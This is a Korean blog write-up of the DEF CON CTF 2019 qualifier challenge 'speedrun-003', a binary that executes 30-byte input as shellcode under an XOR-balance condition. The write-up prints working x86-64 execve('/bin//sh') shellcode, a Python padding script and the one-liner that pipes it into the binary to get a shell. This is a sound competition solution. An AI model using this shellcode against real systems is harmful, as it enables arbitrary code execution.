---
layout: post
title: ! "[DefconCTF 2019] speedrun-003"
excerpt_separator: <!--more-->
comments : true
tags:
  - KRater
  - Defcon CTF
  - Write-up
---

### Description

Defcon CTF 2019 온라인 예선에 나왔던 문제.

다른 팀원들이 일부러인지 안 풀어서 풀어보았다.


<!--more-->

### 문제 풀이

문제 자체는 무지 간단하다.

![]({{ site.baseurl }}/images/KRater/2019-06-01-speedrun003-writeup/pic01.png)

입력 받고, 그대로 쉘코드를 실행시켜 준다. 대신에 조건이 두 가지가 있는데

1) 쉘 코드 길이가 30이어야 하고,

2) 앞 15바이트가 뒤 15바이트와 xor 연산 결과가 같아야 한다.

말 그대로, 앞의 15바이트가 각각 모두 xor한 결과가 뒤의 15바이트를 각각 모두 xor한 결과와 같아야 한다는 것이다.

문제를 풀기 위해 사용한 쉘 코드는 스탠다드한 24바이트짜리 쉘코드이다.

`\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05`

해당 쉘코드의 끝에 도달하면 뒤의 인스트럭션은 실행될 필요가 없으므로, 뒤에 패딩 6바이트를 붙여서 전반부 쉘코드의 xor 된 결과와 후반부 쉘코드의 xor 된 결과를 같게 만들어주면 된다.

```python
sc = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

print (len(sc))
tmp = 0
for i in range (0,15):
    tmp = tmp ^ ord(sc[i])

print ("first 15 bytes : 0x%X" % tmp) # result : 0xCD

tmp = 0
for i in range (15, len(sc)):
    tmp = tmp ^ ord(sc[i])

print ("last 15 bytes : 0x%X" % tmp) # result : 0xC2

#sc[24] = "\xC2" # xored = 0
#sc[25] = "\xCD" # xored = CD
#sc[26] = "\xCD" # xored = 0
#sc[27] = "\xCD" # xored = CD
#sc[28] = "\xCD" # xored = 0
#sc[29] = "\xCD" # xored = CD

sc2 = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\xC2\xCD\xCD\xCD\xCD\xCD"

print (len(sc2))
print (sc2)
```

이제 0xC2를 0xCD로 바꾸어주면 되므로, 뒤에 패딩을 붙인다. 0xC2를 xor해서 0으로 만들어준 뒤, 0xCD를 홀수 번 xor시켜서 최종 결과가 0xCD가 되도록 맞추어 준다.

```bash
cragy0516@argos-edu:~/decon2019/speedrun-003$ (python -c 'print "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\xC2\xCD\xCD\xCD\xCD\xCD"';cat) | ./speedrun-003
Think you can drift?
Send me your drift
ls
cal.py	ex.py  speedrun-003
```

쉘 코드가 성공적으로 실행되었다.